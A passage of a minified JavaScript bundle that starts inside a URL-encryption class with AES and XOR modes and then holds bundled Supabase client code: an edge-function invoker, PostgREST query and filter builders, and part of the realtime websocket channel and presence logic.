Wa("encryption_success","AES encryption completed","info"),{encrypted:c,mode:"aes",context:"aes-primary"}}catch(c){Wa("encryption_fallback","AES failed, using XOR","info",{error:c.message})}const l=await Gn(e,r);if(this.encryptionStats.xorOperations++,!l||l.length<5)throw new Error("XOR encryption failed - no result");return Wa("encryption_success","XOR encryption completed","info"),{encrypted:l,mode:"xor",context:"xor-secure"}}finally{So.clearEncryptionKey(i)}}catch(i){throw Wa("encryption_failure","All encryption methods failed","error",{error:i.message}),new Error(`Encryption failure: ${i.message}`)}}selectOptimalEncryptionMode(e,r){if(r&&r.length>=16){const n=e.includes("bank")||e.includes("gov")||e.includes("secure"),s=e.length>100;if(n||s||this.encryptionStats.aesSuccessRate>.9)return"aes"}return"xor"}getEncryptionStats(){return{...this.encryptionStats,aesPercentage:this.encryptionStats.totalOperations>0?(this.encryptionStats.aesOperations/this.encryptionStats.totalOperations*100).toFixed(1):"0.0",xorPercentage:this.encryptionStats.totalOperations>0?(this.encryptionStats.xorOperations/this.encryptionStats.totalOperations*100).toFixed(1):"0.0"}}async decryptUrl(e,r,n){if(n==="aes")try{const s=await w0.decrypt(e,r);if(s.success)return s.plaintext;throw new Error("AES decryption failed")}catch{return Tl(e)}return Tl(e)}detectEncryptionMode(e){const{isBase34Encoded:r}=require("./base34Encoder");return r(e)?e.length>80&&e.includes("9")?"aes":"xor":e.length>100&&e.includes(".")?"aes":"xor"}}const Ur=new jk,_k=t=>{let e;return t?e=t:typeof fetch>"u"?e=(...r)=>Vt(async()=>{const{default:n}=await Promise.resolve().then(()=>La);return{default:n}},void 0).then(({default:n})=>n(...r)):e=fetch,(...r)=>e(...r)};class hf extends Error{constructor(e,r="FunctionsError",n){super(e),this.name=r,this.context=n}}class Nk extends hf{constructor(e){super("Failed to send a request to the Edge Function","FunctionsFetchError",e)}}class j0 extends hf{constructor(e){super("Relay Error invoking the Edge Function","FunctionsRelayError",e)}}class _0 extends hf{constructor(e){super("Edge Function returned a non-2xx status code","FunctionsHttpError",e)}}var Nu;(function(t){t.Any="any",t.ApNortheast1="ap-northeast-1",t.ApNortheast2="ap-northeast-2",t.ApSouth1="ap-south-1",t.ApSoutheast1="ap-southeast-1",t.ApSoutheast2="ap-southeast-2",t.CaCentral1="ca-central-1",t.EuCentral1="eu-central-1",t.EuWest1="eu-west-1",t.EuWest2="eu-west-2",t.EuWest3="eu-west-3",t.SaEast1="sa-east-1",t.UsEast1="us-east-1",t.UsWest1="us-west-1",t.UsWest2="us-west-2"})(Nu||(Nu={}));var Sk=function(t,e,r,n){function s(i){return i instanceof r?i:new r(function(o){o(i)})}return new(r||(r=Promise))(function(i,o){function l(u){try{d(n.next(u))}catch(h){o(h)}}function c(u){try{d(n.throw(u))}catch(h){o(h)}}function d(u){u.done?i(u.value):s(u.value).then(l,c)}d((n=n.apply(t,e||[])).next())})};class kk{constructor(e,{headers:r={},customFetch:n,region:s=Nu.Any}={}){this.url=e,this.headers=r,this.region=s,this.fetch=_k(n)}setAuth(e){this.headers.Authorization=`Bearer ${e}`}invoke(e,r={}){var n;return Sk(this,void 0,void 0,function*(){try{const{headers:s,method:i,body:o}=r;let l={},{region:c}=r;c||(c=this.region);const d=new URL(`${this.url}/${e}`);c&&c!=="any"&&(l["x-region"]=c,d.searchParams.set("forceFunctionRegion",c));let u;o&&(s&&!Object.prototype.hasOwnProperty.call(s,"Content-Type")||!s)&&(typeof Blob<"u"&&o instanceof Blob||o instanceof ArrayBuffer?(l["Content-Type"]="application/octet-stream",u=o):typeof o=="string"?(l["Content-Type"]="text/plain",u=o):typeof FormData<"u"&&o instanceof FormData?u=o:(l["Content-Type"]="application/json",u=JSON.stringify(o)));const h=yield this.fetch(d.toString(),{method:i||"POST",headers:Object.assign(Object.assign(Object.assign({},l),this.headers),s),body:u}).catch(v=>{throw new Nk(v)}),f=h.headers.get("x-relay-error");if(f&&f==="true")throw new j0(h);if(!h.ok)throw new _0(h);let m=((n=h.headers.get("Content-Type"))!==null&&n!==void 0?n:"text/plain").split(";")[0].trim(),g;return m==="application/json"?g=yield h.json():m==="application/octet-stream"?g=yield h.blob():m==="text/event-stream"?g=h:m==="multipart/form-data"?g=yield h.formData():g=yield h.text(),{data:g,error:null,response:h}}catch(s){return{data:null,error:s,response:s instanceof _0||s instanceof j0?s.context:void 0}}})}}var vt={},ff={},dc={},Xi={},uc={},hc={},Ek=function(){if(typeof self<"u")return self;if(typeof window<"u")return window;if(typeof global<"u")return global;throw new Error("unable to locate global object")},Sa=Ek();const Ck=Sa.fetch,lv=Sa.fetch.bind(Sa),cv=Sa.Headers,Tk=Sa.Request,Pk=Sa.Response,La=Object.freeze(Object.defineProperty({__proto__:null,Headers:cv,Request:Tk,Response:Pk,default:lv,fetch:Ck},Symbol.toStringTag,{value:"Module"})),Ak=gb(La);var fc={};Object.defineProperty(fc,"__esModule",{value:!0});let Rk=class extends Error{constructor(e){super(e.message),this.name="PostgrestError",this.details=e.details,this.hint=e.hint,this.code=e.code}};fc.default=Rk;var dv=Kt&&Kt.__importDefault||function(t){return t&&t.__esModule?t:{default:t}};Object.defineProperty(hc,"__esModule",{value:!0});const Ik=dv(Ak),Lk=dv(fc);let Mk=class{constructor(e){this.shouldThrowOnError=!1,this.method=e.method,this.url=e.url,this.headers=e.headers,this.schema=e.schema,this.body=e.body,this.shouldThrowOnError=e.shouldThrowOnError,this.signal=e.signal,this.isMaybeSingle=e.isMaybeSingle,e.fetch?this.fetch=e.fetch:typeof fetch>"u"?this.fetch=Ik.default:this.fetch=fetch}throwOnError(){return this.shouldThrowOnError=!0,this}setHeader(e,r){return this.headers=Object.assign({},this.headers),this.headers[e]=r,this}then(e,r){this.schema===void 0||(["GET","HEAD"].includes(this.method)?this.headers["Accept-Profile"]=this.schema:this.headers["Content-Profile"]=this.schema),this.method!=="GET"&&this.method!=="HEAD"&&(this.headers["Content-Type"]="application/json");const n=this.fetch;let s=n(this.url.toString(),{method:this.method,headers:this.headers,body:JSON.stringify(this.body),signal:this.signal}).then(async i=>{var o,l,c;let d=null,u=null,h=null,f=i.status,m=i.statusText;if(i.ok){if(this.method!=="HEAD"){const y=await i.text();y===""||(this.headers.Accept==="text/csv"||this.headers.Accept&&this.headers.Accept.includes("application/vnd.pgrst.plan+text")?u=y:u=JSON.parse(y))}const v=(o=this.headers.Prefer)===null||o===void 0?void 0:o.match(/count=(exact|planned|estimated)/),w=(l=i.headers.get("content-range"))===null||l===void 0?void 0:l.split("/");v&&w&&w.length>1&&(h=parseInt(w[1])),this.isMaybeSingle&&this.method==="GET"&&Array.isArray(u)&&(u.length>1?(d={code:"PGRST116",details:`Results contain ${u.length} rows, application/vnd.pgrst.object+json requires 1 row`,hint:null,message:"JSON object requested, multiple (or no) rows returned"},u=null,h=null,f=406,m="Not Acceptable"):u.length===1?u=u[0]:u=null)}else{const v=await i.text();try{d=JSON.parse(v),Array.isArray(d)&&i.status===404&&(u=[],d=null,f=200,m="OK")}catch{i.status===404&&v===""?(f=204,m="No Content"):d={message:v}}if(d&&this.isMaybeSingle&&(!((c=d==null?void 0:d.details)===null||c===void 0)&&c.includes("0 rows"))&&(d=null,f=200,m="OK"),d&&this.shouldThrowOnError)throw new Lk.default(d)}return{error:d,data:u,count:h,status:f,statusText:m}});return this.shouldThrowOnError||(s=s.catch(i=>{var o,l,c;return{error:{message:`${(o=i==null?void 0:i.name)!==null&&o!==void 0?o:"FetchError"}: ${i==null?void 0:i.message}`,details:`${(l=i==null?void 0:i.stack)!==null&&l!==void 0?l:""}`,hint:"",code:`${(c=i==null?void 0:i.code)!==null&&c!==void 0?c:""}`},data:null,count:null,status:0,statusText:""}})),s.then(e,r)}returns(){return this}overrideTypes(){return this}};hc.default=Mk;var Ok=Kt&&Kt.__importDefault||function(t){return t&&t.__esModule?t:{default:t}};Object.defineProperty(uc,"__esModule",{value:!0});const $k=Ok(hc);let Uk=class extends $k.default{select(e){let r=!1;const n=(e??"*").split("").map(s=>/\s/.test(s)&&!r?"":(s==='"'&&(r=!r),s)).join("");return this.url.searchParams.set("select",n),this.headers.Prefer&&(this.headers.Prefer+=","),this.headers.Prefer+="return=representation",this}order(e,{ascending:r=!0,nullsFirst:n,foreignTable:s,referencedTable:i=s}={}){const o=i?`${i}.order`:"order",l=this.url.searchParams.get(o);return this.url.searchParams.set(o,`${l?`${l},`:""}${e}.${r?"asc":"desc"}${n===void 0?"":n?".nullsfirst":".nullslast"}`),this}limit(e,{foreignTable:r,referencedTable:n=r}={}){const s=typeof n>"u"?"limit":`${n}.limit`;return this.url.searchParams.set(s,`${e}`),this}range(e,r,{foreignTable:n,referencedTable:s=n}={}){const i=typeof s>"u"?"offset":`${s}.offset`,o=typeof s>"u"?"limit":`${s}.limit`;return this.url.searchParams.set(i,`${e}`),this.url.searchParams.set(o,`${r-e+1}`),this}abortSignal(e){return this.signal=e,this}single(){return this.headers.Accept="application/vnd.pgrst.object+json",this}maybeSingle(){return this.method==="GET"?this.headers.Accept="application/json":this.headers.Accept="application/vnd.pgrst.object+json",this.isMaybeSingle=!0,this}csv(){return this.headers.Accept="text/csv",this}geojson(){return this.headers.Accept="application/geo+json",this}explain({analyze:e=!1,verbose:r=!1,settings:n=!1,buffers:s=!1,wal:i=!1,format:o="text"}={}){var l;const c=[e?"analyze":null,r?"verbose":null,n?"settings":null,s?"buffers":null,i?"wal":null].filter(Boolean).join("|"),d=(l=this.headers.Accept)!==null&&l!==void 0?l:"application/json";return this.headers.Accept=`application/vnd.pgrst.plan+${o}; for="${d}"; options=${c};`,o==="json"?this:this}rollback(){var e;return((e=this.headers.Prefer)!==null&&e!==void 0?e:"").trim().length>0?this.headers.Prefer+=",tx=rollback":this.headers.Prefer="tx=rollback",this}returns(){return this}};uc.default=Uk;var Dk=Kt&&Kt.__importDefault||function(t){return t&&t.__esModule?t:{default:t}};Object.defineProperty(Xi,"__esModule",{value:!0});const zk=Dk(uc);let Fk=class extends zk.default{eq(e,r){return this.url.searchParams.append(e,`eq.${r}`),this}neq(e,r){return this.url.searchParams.append(e,`neq.${r}`),this}gt(e,r){return this.url.searchParams.append(e,`gt.${r}`),this}gte(e,r){return this.url.searchParams.append(e,`gte.${r}`),this}lt(e,r){return this.url.searchParams.append(e,`lt.${r}`),this}lte(e,r){return this.url.searchParams.append(e,`lte.${r}`),this}like(e,r){return this.url.searchParams.append(e,`like.${r}`),this}likeAllOf(e,r){return this.url.searchParams.append(e,`like(all).{${r.join(",")}}`),this}likeAnyOf(e,r){return this.url.searchParams.append(e,`like(any).{${r.join(",")}}`),this}ilike(e,r){return this.url.searchParams.append(e,`ilike.${r}`),this}ilikeAllOf(e,r){return this.url.searchParams.append(e,`ilike(all).{${r.join(",")}}`),this}ilikeAnyOf(e,r){return this.url.searchParams.append(e,`ilike(any).{${r.join(",")}}`),this}is(e,r){return this.url.searchParams.append(e,`is.${r}`),this}in(e,r){const n=Array.from(new Set(r)).map(s=>typeof s=="string"&&new RegExp("[,()]").test(s)?`"${s}"`:`${s}`).join(",");return this.url.searchParams.append(e,`in.(${n})`),this}contains(e,r){return typeof r=="string"?this.url.searchParams.append(e,`cs.${r}`):Array.isArray(r)?this.url.searchParams.append(e,`cs.{${r.join(",")}}`):this.url.searchParams.append(e,`cs.${JSON.stringify(r)}`),this}containedBy(e,r){return typeof r=="string"?this.url.searchParams.append(e,`cd.${r}`):Array.isArray(r)?this.url.searchParams.append(e,`cd.{${r.join(",")}}`):this.url.searchParams.append(e,`cd.${JSON.stringify(r)}`),this}rangeGt(e,r){return this.url.searchParams.append(e,`sr.${r}`),this}rangeGte(e,r){return this.url.searchParams.append(e,`nxl.${r}`),this}rangeLt(e,r){return this.url.searchParams.append(e,`sl.${r}`),this}rangeLte(e,r){return this.url.searchParams.append(e,`nxr.${r}`),this}rangeAdjacent(e,r){return this.url.searchParams.append(e,`adj.${r}`),this}overlaps(e,r){return typeof r=="string"?this.url.searchParams.append(e,`ov.${r}`):this.url.searchParams.append(e,`ov.{${r.join(",")}}`),this}textSearch(e,r,{config:n,type:s}={}){let i="";s==="plain"?i="pl":s==="phrase"?i="ph":s==="websearch"&&(i="w");const o=n===void 0?"":`(${n})`;return this.url.searchParams.append(e,`${i}fts${o}.${r}`),this}match(e){return Object.entries(e).forEach(([r,n])=>{this.url.searchParams.append(r,`eq.${n}`)}),this}not(e,r,n){return this.url.searchParams.append(e,`not.${r}.${n}`),this}or(e,{foreignTable:r,referencedTable:n=r}={}){const s=n?`${n}.or`:"or";return this.url.searchParams.append(s,`(${e})`),this}filter(e,r,n){return this.url.searchParams.append(e,`${r}.${n}`),this}};Xi.default=Fk;var Bk=Kt&&Kt.__importDefault||function(t){return t&&t.__esModule?t:{default:t}};Object.defineProperty(dc,"__esModule",{value:!0});const Ka=Bk(Xi);let Vk=class{constructor(e,{headers:r={},schema:n,fetch:s}){this.url=e,this.headers=r,this.schema=n,this.fetch=s}select(e,{head:r=!1,count:n}={}){const s=r?"HEAD":"GET";let i=!1;const o=(e??"*").split("").map(l=>/\s/.test(l)&&!i?"":(l==='"'&&(i=!i),l)).join("");return this.url.searchParams.set("select",o),n&&(this.headers.Prefer=`count=${n}`),new Ka.default({method:s,url:this.url,headers:this.headers,schema:this.schema,fetch:this.fetch,allowEmpty:!1})}insert(e,{count:r,defaultToNull:n=!0}={}){const s="POST",i=[];if(this.headers.Prefer&&i.push(this.headers.Prefer),r&&i.push(`count=${r}`),n||i.push("missing=default"),this.headers.Prefer=i.join(","),Array.isArray(e)){const o=e.reduce((l,c)=>l.concat(Object.keys(c)),[]);if(o.length>0){const l=[...new Set(o)].map(c=>`"${c}"`);this.url.searchParams.set("columns",l.join(","))}}return new Ka.default({method:s,url:this.url,headers:this.headers,schema:this.schema,body:e,fetch:this.fetch,allowEmpty:!1})}upsert(e,{onConflict:r,ignoreDuplicates:n=!1,count:s,defaultToNull:i=!0}={}){const o="POST",l=[`resolution=${n?"ignore":"merge"}-duplicates`];if(r!==void 0&&this.url.searchParams.set("on_conflict",r),this.headers.Prefer&&l.push(this.headers.Prefer),s&&l.push(`count=${s}`),i||l.push("missing=default"),this.headers.Prefer=l.join(","),Array.isArray(e)){const c=e.reduce((d,u)=>d.concat(Object.keys(u)),[]);if(c.length>0){const d=[...new Set(c)].map(u=>`"${u}"`);this.url.searchParams.set("columns",d.join(","))}}return new Ka.default({method:o,url:this.url,headers:this.headers,schema:this.schema,body:e,fetch:this.fetch,allowEmpty:!1})}update(e,{count:r}={}){const n="PATCH",s=[];return this.headers.Prefer&&s.push(this.headers.Prefer),r&&s.push(`count=${r}`),this.headers.Prefer=s.join(","),new Ka.default({method:n,url:this.url,headers:this.headers,schema:this.schema,body:e,fetch:this.fetch,allowEmpty:!1})}delete({count:e}={}){const r="DELETE",n=[];return e&&n.push(`count=${e}`),this.headers.Prefer&&n.unshift(this.headers.Prefer),this.headers.Prefer=n.join(","),new Ka.default({method:r,url:this.url,headers:this.headers,schema:this.schema,fetch:this.fetch,allowEmpty:!1})}};dc.default=Vk;var mc={},pc={};Object.defineProperty(pc,"__esModule",{value:!0});pc.version=void 0;pc.version="0.0.0-automated";Object.defineProperty(mc,"__esModule",{value:!0});mc.DEFAULT_HEADERS=void 0;const Hk=pc;mc.DEFAULT_HEADERS={"X-Client-Info":`postgrest-js/${Hk.version}`};var uv=Kt&&Kt.__importDefault||function(t){return t&&t.__esModule?t:{default:t}};Object.defineProperty(ff,"__esModule",{value:!0});const Gk=uv(dc),Wk=uv(Xi),Kk=mc;let qk=class hv{constructor(e,{headers:r={},schema:n,fetch:s}={}){this.url=e,this.headers=Object.assign(Object.assign({},Kk.DEFAULT_HEADERS),r),this.schemaName=n,this.fetch=s}from(e){const r=new URL(`${this.url}/${e}`);return new Gk.default(r,{headers:Object.assign({},this.headers),schema:this.schemaName,fetch:this.fetch})}schema(e){return new hv(this.url,{headers:this.headers,schema:e,fetch:this.fetch})}rpc(e,r={},{head:n=!1,get:s=!1,count:i}={}){let o;const l=new URL(`${this.url}/rpc/${e}`);let c;n||s?(o=n?"HEAD":"GET",Object.entries(r).filter(([u,h])=>h!==void 0).map(([u,h])=>[u,Array.isArray(h)?`{${h.join(",")}}`:`${h}`]).forEach(([u,h])=>{l.searchParams.append(u,h)})):(o="POST",c=r);const d=Object.assign({},this.headers);return i&&(d.Prefer=`count=${i}`),new Wk.default({method:o,url:l,headers:d,schema:this.schemaName,body:c,fetch:this.fetch,allowEmpty:!1})}};ff.default=qk;var Ma=Kt&&Kt.__importDefault||function(t){return t&&t.__esModule?t:{default:t}};Object.defineProperty(vt,"__esModule",{value:!0});vt.PostgrestError=vt.PostgrestBuilder=vt.PostgrestTransformBuilder=vt.PostgrestFilterBuilder=vt.PostgrestQueryBuilder=vt.PostgrestClient=void 0;const fv=Ma(ff);vt.PostgrestClient=fv.default;const mv=Ma(dc);vt.PostgrestQueryBuilder=mv.default;const pv=Ma(Xi);vt.PostgrestFilterBuilder=pv.default;const gv=Ma(uc);vt.PostgrestTransformBuilder=gv.default;const xv=Ma(hc);vt.PostgrestBuilder=xv.default;const yv=Ma(fc);vt.PostgrestError=yv.default;var Qk=vt.default={PostgrestClient:fv.default,PostgrestQueryBuilder:mv.default,PostgrestFilterBuilder:pv.default,PostgrestTransformBuilder:gv.default,PostgrestBuilder:xv.default,PostgrestError:yv.default};const{PostgrestClient:Yk,PostgrestQueryBuilder:$C,PostgrestFilterBuilder:UC,PostgrestTransformBuilder:DC,PostgrestBuilder:zC,PostgrestError:FC}=Qk;function Jk(){if(typeof WebSocket<"u")return WebSocket;if(typeof global.WebSocket<"u")return global.WebSocket;if(typeof window.WebSocket<"u")return window.WebSocket;if(typeof self.WebSocket<"u")return self.WebSocket;throw new Error("`WebSocket` is not supported in this environment")}const Xk=Jk(),Zk="2.11.15",eE=`realtime-js/${Zk}`,tE="1.0.0",vv=1e4,rE=1e3;var ci;(function(t){t[t.connecting=0]="connecting",t[t.open=1]="open",t[t.closing=2]="closing",t[t.closed=3]="closed"})(ci||(ci={}));var at;(function(t){t.closed="closed",t.errored="errored",t.joined="joined",t.joining="joining",t.leaving="leaving"})(at||(at={}));var nr;(function(t){t.close="phx_close",t.error="phx_error",t.join="phx_join",t.reply="phx_reply",t.leave="phx_leave",t.access_token="access_token"})(nr||(nr={}));var Su;(function(t){t.websocket="websocket"})(Su||(Su={}));var Kn;(function(t){t.Connecting="connecting",t.Open="open",t.Closing="closing",t.Closed="closed"})(Kn||(Kn={}));class nE{constructor(){this.HEADER_LENGTH=1}decode(e,r){return e.constructor===ArrayBuffer?r(this._binaryDecode(e)):r(typeof e=="string"?JSON.parse(e):{})}_binaryDecode(e){const r=new DataView(e),n=new TextDecoder;return this._decodeBroadcast(e,r,n)}_decodeBroadcast(e,r,n){const s=r.getUint8(1),i=r.getUint8(2);let o=this.HEADER_LENGTH+2;const l=n.decode(e.slice(o,o+s));o=o+s;const c=n.decode(e.slice(o,o+i));o=o+i;const d=JSON.parse(n.decode(e.slice(o,e.byteLength)));return{ref:null,topic:l,event:c,payload:d}}}class bv{constructor(e,r){this.callback=e,this.timerCalc=r,this.timer=void 0,this.tries=0,this.callback=e,this.timerCalc=r}reset(){this.tries=0,clearTimeout(this.timer)}scheduleTimeout(){clearTimeout(this.timer),this.timer=setTimeout(()=>{this.tries=this.tries+1,this.callback()},this.timerCalc(this.tries+1))}}var Ee;(function(t){t.abstime="abstime",t.bool="bool",t.date="date",t.daterange="daterange",t.float4="float4",t.float8="float8",t.int2="int2",t.int4="int4",t.int4range="int4range",t.int8="int8",t.int8range="int8range",t.json="json",t.jsonb="jsonb",t.money="money",t.numeric="numeric",t.oid="oid",t.reltime="reltime",t.text="text",t.time="time",t.timestamp="timestamp",t.timestamptz="timestamptz",t.timetz="timetz",t.tsrange="tsrange",t.tstzrange="tstzrange"})(Ee||(Ee={}));const N0=(t,e,r={})=>{var n;const s=(n=r.skipTypes)!==null&&n!==void 0?n:[];return Object.keys(e).reduce((i,o)=>(i[o]=sE(o,t,e,s),i),{})},sE=(t,e,r,n)=>{const s=e.find(l=>l.name===t),i=s==null?void 0:s.type,o=r[t];return i&&!n.includes(i)?wv(i,o):ku(o)},wv=(t,e)=>{if(t.charAt(0)==="_"){const r=t.slice(1,t.length);return lE(e,r)}switch(t){case Ee.bool:return aE(e);case Ee.float4:case Ee.float8:case Ee.int2:case Ee.int4:case Ee.int8:case Ee.numeric:case Ee.oid:return iE(e);case Ee.json:case Ee.jsonb:return oE(e);case Ee.timestamp:return cE(e);case Ee.abstime:case Ee.date:case Ee.daterange:case Ee.int4range:case Ee.int8range:case Ee.money:case Ee.reltime:case Ee.text:case Ee.time:case Ee.timestamptz:case Ee.timetz:case Ee.tsrange:case Ee.tstzrange:return ku(e);default:return ku(e)}},ku=t=>t,aE=t=>{switch(t){case"t":return!0;case"f":return!1;default:return t}},iE=t=>{if(typeof t=="string"){const e=parseFloat(t);if(!Number.isNaN(e))return e}return t},oE=t=>{if(typeof t=="string")try{return JSON.parse(t)}catch(e){return console.log(`JSON parse error: ${e}`),t}return t},lE=(t,e)=>{if(typeof t!="string")return t;const r=t.length-1,n=t[r];if(t[0]==="{"&&n==="}"){let i;const o=t.slice(1,r);try{i=JSON.parse("["+o+"]")}catch{i=o?o.split(","):[]}return i.map(l=>wv(e,l))}return t},cE=t=>typeof t=="string"?t.replace(" ","T"):t,jv=t=>{let e=t;return e=e.replace(/^ws/i,"http"),e=e.replace(/(\/socket\/websocket|\/socket|\/websocket)\/?$/i,""),e.replace(/\/+$/,"")};class nd{constructor(e,r,n={},s=vv){this.channel=e,this.event=r,this.payload=n,this.timeout=s,this.sent=!1,this.timeoutTimer=void 0,this.ref="",this.receivedResp=null,this.recHooks=[],this.refEvent=null}resend(e){this.timeout=e,this._cancelRefEvent(),this.ref="",this.refEvent=null,this.receivedResp=null,this.sent=!1,this.send()}send(){this._hasReceived("timeout")||(this.startTimeout(),this.sent=!0,this.channel.socket.push({topic:this.channel.topic,event:this.event,payload:this.payload,ref:this.ref,join_ref:this.channel._joinRef()}))}updatePayload(e){this.payload=Object.assign(Object.assign({},this.payload),e)}receive(e,r){var n;return this._hasReceived(e)&&r((n=this.receivedResp)===null||n===void 0?void 0:n.response),this.recHooks.push({status:e,callback:r}),this}startTimeout(){if(this.timeoutTimer)return;this.ref=this.channel.socket._makeRef(),this.refEvent=this.channel._replyEventName(this.ref);const e=r=>{this._cancelRefEvent(),this._cancelTimeout(),this.receivedResp=r,this._matchReceive(r)};this.channel._on(this.refEvent,{},e),this.timeoutTimer=setTimeout(()=>{this.trigger("timeout",{})},this.timeout)}trigger(e,r){this.refEvent&&this.channel._trigger(this.refEvent,{status:e,response:r})}destroy(){this._cancelRefEvent(),this._cancelTimeout()}_cancelRefEvent(){this.refEvent&&this.channel._off(this.refEvent,{})}_cancelTimeout(){clearTimeout(this.timeoutTimer),this.timeoutTimer=void 0}_matchReceive({status:e,response:r}){this.recHooks.filter(n=>n.status===e).forEach(n=>n.callback(r))}_hasReceived(e){return this.receivedResp&&this.receivedResp.status===e}}var S0;(function(t){t.SYNC="sync",t.JOIN="join",t.LEAVE="leave"})(S0||(S0={}));class di{constructor(e,r){this.channel=e,this.state={},this.pendingDiffs=[],this.joinRef=null,this.caller={onJoin:()=>{},onLeave:()=>{},onSync:()=>{}};const n=(r==null?void 0:r.events)||{state:"presence_state",diff:"presence_diff"};this.channel._on(n.state,{},s=>{const{onJoin:i,onLeave:o,onSync:l}=this.caller;this.joinRef=this.channel._joinRef(),this.state=di.syncState(this.state,s,i,o),this.pendingDiffs.forEach(c=>{this.state=di.syncDiff(this.state,c,i,o)}),this.pendingDiffs=[],l()}),this.channel._on(n.diff,{},s=>{const{onJoin:i,onLeave:o,onSync:l}=this.caller;this.inPendingSyncState()?this.pendingDiffs.push(s):(this.state=di.syncDiff(this.state,s,i,o),l())}),this.onJoin((s,i,o)=>{this.channel._trigger("presence",{event:"join",key:s,currentPresences:i,newPresences:o})}),this.onLeave((s,i,o)=>{this.channel._trigger("presence",{event:"leave",key:s,currentPresences:i,leftPresences:o})}),this.onSync(()=>{this.channel._trigger("presence",{event:"sync"})})}static syncState(e,r,n,s){const i=this.cloneDeep(e),o=this.transformState(r),l={},c={};return this.map(i,(d,u)=>{o[d]||(c[d]=u)}),this.map(o,(d,u)=>{const h=i[d];if(h){const f=u.map(w=>w.presence_ref),m=h.map(w=>w.presence_ref),g=u.filter(w=>m.indexOf(w.presence_ref)<0),v=h.filter(w=>f.indexOf(w.presence_ref)<0);g.length>0&&(l[d]=g),v.length>0&&(c[d]=v)}else l[d]=u}),this.syncDiff(i,{joins:l,leaves:c},n,s)}static syncDiff(e,r,n,s){const{joins:i,leaves:o}={joins:this.transformState(r.joins),leaves:this.transformState(r.leaves)};return n||(n=()=>{}),s||(s=()=>{}),this.map(i,(l,c)=>{var d;const u=(d=e[l])!==null&&d!==void 0?d:[];if(e[l]=this.cloneDeep(c),u.length>0){const h=e[l].map(m=>m.presence_ref),f=u.filter(m=>h.indexOf(m.presence_ref)<0);e[l].unshift(...f)}n(l,u,c)}),this.map(o,(l,c)=>{let d=e[l];if(!d)return;const u=c.map(h=>h.presence_ref);d=d.filter(h=>u.indexOf(h.presence_ref)<0),e[l]=d,s(l,d,c),d.length===0&&delete e[l]}),e}static map(e,r){return Object.getOwnPropertyNames(e).map(n=>r(n,e[n]))}static transformState(e){return e=this.cloneDeep(e),Object.getOwnPropertyNames(e).reduce((r,n)=>{const s=e[n];return"metas"in s?r[n]=s.metas.map(i=>(i.presence_ref=i.phx_ref,delete i.phx_ref,delete i.phx_ref_prev,i)):r[n]=s,r},{})}static cloneDeep(e){return JSON.parse(JSON.stringify(e))}onJoin(e){this.caller.onJoin=e}onLeave(e){this.caller.onLeave=e}onSync(e){this.caller.onSync=e}inPendingSyncState(){return!this.joinRef||this.joinRef!==this.channel._joinRef()}}var k0;(function(t){t.ALL="*",t.INSERT="INSERT",t.UPDATE="UPDATE",t.DELETE="DELETE"})(k0||(k0={}));var E0;(function(t){t.BROADCAST="broadcast",t.PRESENCE="presence",t.POSTGRES_CHANGES="postgres_changes",t.SYSTEM="system"})(E0||(E0={}));var Rr;(function(t){t.SUBSCRIBED="SUBSCRIBED",t.TIMED_OUT="TIMED_OUT",t.CLOSED="CLOSED",t.CHANNEL_ERROR="CHANNEL_ERROR"})(Rr||(Rr={}));class mf{constructor(e,r={config:{}},n){this.topic=e,this.params=r,this.socket=n,this.bindings={},this.state=at.closed,this.joinedOnce=!1,this.pushBuffer=[],this.subTopic=e.replace(/^realtime:/i,""),this.params.config=Object.assign({broadcast:{ack:!1,self:!1},presence:{key:""},private:!1},r.config),this.timeout=this.socket.timeout,this.joinPush=new nd(this,nr.join,this.params,this.timeout),this.rejoinTimer=new bv(()=>this._rejoinUntilConnected(),this.socket.reconnectAfterMs),this.joinPush.receive("ok",()=>{this.state=at.joined,this.rejoinTimer.reset(),this.pushBuffer.forEach(s=>s.send()),this.pushBuffer=[]}),this._onClose(()=>{this.rejoinTimer.reset(),this.socket.log("channel",`close ${this.topic} ${this._joinRef()}`),this.state=at.closed,this.socket._remove(this)}),this._onError(s=>{this._isLeaving()||this._isClosed()||(this.socket.log("channel",`error ${this.topic}`,s),this.state=at.errored,this.rejoinTimer.scheduleTimeout())}),this.joinPush.receive("timeout",()=>{this._isJoining()&&(this.socket.log("channel",`timeout ${this.topic}`,this.joinPush.timeout),this.state=at.errored,this.rejoinTimer.scheduleTimeout())}),this._on(nr.reply,{},(s,i)=>{this._trigger(this._replyEventName(i),s)}),this.presence=new di(this),this.broadcastEndpointURL=jv(this.socket.endPoint)+"/api/broadcast",this.private=this.params.config.private||!1}subscribe(e,r=this.timeout){var n,s;if(this.socket.isConnected()||this.socket.connect(),this.state==at.closed){const{config:{broadcast:i,presence:o,private:l}}=this.params;this._onError(u=>e==null?void 0:e(Rr.CHANNEL_ERROR,u)),this._onClose(()=>e==null?void 0:e(Rr.CLOSED));const c={},d={broadcast:i,presence:o,postgres_changes:(s=(n=this.bindings.postgres_changes)===null||n===void 0?void 0:n.map(u=>u.filter))!==null&&s!==void 0?s:[],private:l};this.socket.accessTokenValue&&(c.access_token=this.socket.accessTokenValue),this.updateJoinPayload(Object.assign({config:d},c)),this.joinedOnce=!0,this._rejoin(r),this.joinPush.receive("ok",async({postgres_changes:u})=>{var h;if(this.socket.setAuth(),u===void 0){e==null||e(Rr.SUBSCRIBED);return}else{const f=this.bindings.postgres_changes,m=(h=f==null?void 0:f.length)!==null&&h!==void 0?h:0,g=[];for(let v=0;v<m;v++){const w=f[v],{filter:{event:y,schema:x,table:b,filter:j}}=w,_=u&&u[v];if(_&&_.event===y&&_.schema===x&&_.table===b&&_.filter===j)g.push(Object.assign(Object.assign({},w),{id:_.id}));else{this.unsubscribe(),this.state=at.errored,e==null||e(Rr.CHANNEL_ERROR,new Error("mismatch between server and client bindings for postgres changes"));return}}this.bindings.postgres_changes=g,e&&e(Rr.SUBSCRIBED);return}}).receive("error",u=>{this.state=at.errored,e==null||e(Rr.CHANNEL_ERROR,new Error(JSON.stringify(Object.values(u).join(", ")||"error")))}).receive("timeout",()=>{e==null||e(Rr.TIMED_OUT)})}return this}presenceState(){return this.presence.state}async track(e,r={}){return await this.send({type:"presence",event:"track",payload:e},r.timeout||this.timeout)}async untrack(e={}){return await this.send({type:"presence",event:"untrack"},e)}on(e,r,n){return this._on(e,r,n)}async send(e,r={}){var n,s;if(!this._canPush()&&e.type==="broadcast"){const{event:i,payload:o}=e,c={method:"POST",headers:{Authorization:this.socket.accessTokenValue?`Bearer 